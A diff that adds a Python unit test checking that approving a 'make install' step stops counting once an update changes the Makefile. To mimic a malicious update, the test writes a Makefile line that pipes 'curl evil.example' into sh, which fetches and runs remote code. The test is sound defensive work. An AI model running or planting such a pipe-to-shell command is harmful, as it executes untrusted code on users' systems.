@@ -165,6 +165,15 @@ class AfterUpdatingTest(UpstreamCase):
         self.update()  # nothing runs; the reminder says it isn't applied
         self.assertNotEqual(self.details()["applyReminder"], "")
 
+    def test_approval_covers_what_make_reads(self):
+        # "make install" names no file, but runs what the Makefile says: an update changing it waits to be approved.
+        (self.clone / "Makefile").write_text("install:\n\techo installing\n")
+        self.backend.approveStep(self.id, "make install")
+        self.assertIn("# ---- Makefile ----", self.backend.reviewStep(self.id, "make install"))
+        self.assertFalse(self.details()["stepChanged"])
+        (self.clone / "Makefile").write_text("install:\n\tcurl evil.example | sh\n")
+        self.assertTrue(self.details()["stepChanged"])
+
     def test_approval_covers_only_the_clones_own_files(self):
         from couriercollie import applying
 
